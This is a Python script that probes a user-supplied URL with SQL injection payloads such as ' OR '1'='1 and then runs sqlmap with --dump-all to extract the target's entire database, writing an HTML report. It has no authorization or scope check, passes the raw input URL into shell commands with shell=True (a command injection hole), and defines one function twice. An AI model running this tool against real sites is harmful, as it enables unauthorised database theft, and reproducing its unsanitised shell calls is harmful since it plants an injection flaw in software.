import requests
import subprocess
from urllib.parse import urlparse, parse_qs
import os
import csv
from concurrent.futures import ThreadPoolExecutor, as_completed

# Path for the report and SQLMap CSV output
REPORT_FILE = 'report_sql.html'
SQLMAP_OUTPUT_DIR = os.path.join(os.getenv('LOCALAPPDATA'), 'sqlmap', 'output')

def generate_report(vulnerabilities, base_url):
    unique_vulnerabilities = list(set(vulnerabilities))  # Remove duplicates
    with open(REPORT_FILE, 'w') as f:
        f.write('<html>\n<head>\n<title>SQL Injection Vulnerability Report</title>\n</head>\n<body>\n')
        f.write('<h1>SQL Injection Vulnerability Report</h1>\n')
        f.write(f'<p>Report for: <a href="{base_url}">{base_url}</a></p>\n')
        
        count = len(unique_vulnerabilities)
        f.write(f'<p>Total vulnerabilities found: {count}</p>\n')
        
        if unique_vulnerabilities:
            f.write('<ul>\n')
            for vuln in unique_vulnerabilities:
                f.write(f'<li><a href="{vuln}">{vuln}</a></li>\n')
            f.write('</ul>\n')
        else:
            f.write('<p>No vulnerabilities detected.</p>\n')
        
        f.write('</body>\n</html>')



def extract_sqlmap_results():
    vulnerabilities = []
    for file in os.listdir(SQLMAP_OUTPUT_DIR):
        if file.endswith('.csv'):
            file_path = os.path.join(SQLMAP_OUTPUT_DIR, file)
            try:
                with open(file_path, newline='') as csvfile:
                    reader = csv.reader(csvfile)
                    for row in reader:
                        if row and row[0] and not row[0].startswith('Target URL'):
                            vulnerabilities.append(row[0].strip())
            except Exception as e:
                print(f"Failed to read CSV file {file_path}: {e}")
    return vulnerabilities

def test_payload(test_url, payload):
    full_url = test_url + payload
    try:
        response = requests.get(full_url, timeout=5)
        if any(error in response.text.lower() for error in ["sql", "mysql", "syntax", "error", "database"]):
            return full_url
    except requests.RequestException as e:
        print(f"Request failed: {e}")
    return None

def test_url_for_injection(url):
    payloads = ["'", '"', "' OR '1'='1", "' OR 1=1 --", "' OR 1=1#", "' OR 'x'='x", "' AND 1=2 --"]
    vulnerabilities = []

    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(test_payload, url, payload) for payload in payloads]
        for future in as_completed(futures):
            result = future.result()
            if result:
                print(f"[+] Potential SQL Injection vulnerability detected at {result}")
                vulnerabilities.append(result)
    
    return vulnerabilities

def handle_no_parameters(url):
    print("[*] No parameters found. Attempting to use sqlmap with crawling.")
    command = f"sqlmap -u {url} --crawl=2 --batch --threads=10"
    subprocess.run(command, shell=True)

def handle_with_parameters(url):
    print("[*] Parameters found. Attempting to use sqlmap directly.")
    command = f"sqlmap -u {url} --batch --dump-all --threads=10"
    subprocess.run(command, shell=True)

def handle_form(url):
    print("[*] Form detected. Attempting to use sqlmap with POST data.")
    form_data = "username=admin&password=pass"
    command = f"sqlmap -u {url} --data=\"{form_data}\" --batch --dump-all --threads=10"
    subprocess.run(command, shell=True)

def extract_sqlmap_results(base_url):
    vulnerabilities = []
    for file in os.listdir(SQLMAP_OUTPUT_DIR):
        if file.endswith('.csv'):
            file_path = os.path.join(SQLMAP_OUTPUT_DIR, file)
            try:
                with open(file_path, newline='') as csvfile:
                    reader = csv.reader(csvfile)
                    for row in reader:
                        if row and base_url in row[0]:  # Ensure URL matches base URL
                            vulnerabilities.append(row[0])  # Assuming the first column has the URL
            except Exception as e:
                print(f"Failed to read CSV file {file_path}: {e}")
    return vulnerabilities


def main():
    base_url = input("Enter the base URL: ").strip()
    
    # Clear previous vulnerabilities list
    vulnerabilities = []

    # Run the SQL Injection tests on the base URL
    parsed_url = urlparse(base_url)
    query_params = parse_qs(parsed_url.query)
    
    if query_params:
        vulnerabilities = test_url_for_injection(base_url)
        if vulnerabilities:
            handle_with_parameters(base_url)
        else:
            print("[-] No SQL Injection vulnerability detected.")
    else:
        handle_no_parameters(base_url)
    
    # Extract only the vulnerabilities related to this base URL from SQLMap's output
    sqlmap_vulnerabilities = extract_sqlmap_results(base_url)
    
    # Combine the direct test results with the SQLMap results
    vulnerabilities = vulnerabilities + sqlmap_vulnerabilities
    
    # Ensure the vulnerabilities list is unique
    vulnerabilities = list(set(vulnerabilities))
    
    # Generate the report with the current scan results
    generate_report(vulnerabilities, base_url)

    
    print(f"[+] Report generated: {os.path.abspath(REPORT_FILE)}")



if __name__ == "__main__":
    main()
